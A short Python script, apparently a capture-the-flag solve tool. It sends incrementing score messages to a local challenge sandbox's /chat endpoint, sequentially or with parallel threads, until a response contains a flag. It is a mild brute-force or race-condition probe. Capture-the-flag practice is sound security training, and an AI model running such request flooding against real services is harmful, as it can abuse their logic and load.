#!/usr/bin/env python3
"""Send ordered score messages to an authorized challenge sandbox."""

from __future__ import annotations

import argparse
import json
import threading
import time
import urllib.request


def post(base: str, user: str, score: int, timeout: float) -> str:
    body = json.dumps({"user": user, "msg": score}).encode()
    request = urllib.request.Request(
        base + "/chat",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read().decode("utf-8", errors="replace")


def sequential(base: str, user: str, limit: int, timeout: float) -> None:
    started = time.time()
    for score in range(1, limit + 1):
        text = post(base, user, score, timeout)
        if score == 1 or score % 50 == 0 or "success" in text or "flag" in text:
            print(score, text[:200])
        if "flag" in text:
            break
    print(f"elapsed={time.time() - started:.3f}s")


def parallel(base: str, user: str, limit: int, workers: int, timeout: float) -> None:
    queue = list(range(1, limit + 1))
    lock = threading.Lock()
    started = time.time()

    def worker() -> None:
        while True:
            with lock:
                if not queue:
                    return
                score = queue.pop(0)
            try:
                text = post(base, user, score, timeout)
                if score % 50 == 0 or "success" in text or "flag" in text:
                    print(score, text[:200])
                if "flag" in text:
                    return
            except Exception as exc:
                print("error", score, exc)

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print(f"elapsed={time.time() - started:.3f}s")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:19306")
    parser.add_argument("--user", default="x")
    parser.add_argument("--limit", type=int, default=500)
    parser.add_argument("--workers", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=10)
    args = parser.parse_args()

    if args.workers <= 1:
        sequential(args.base, args.user, args.limit, args.timeout)
    else:
        parallel(args.base, args.user, args.limit, args.workers, args.timeout)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
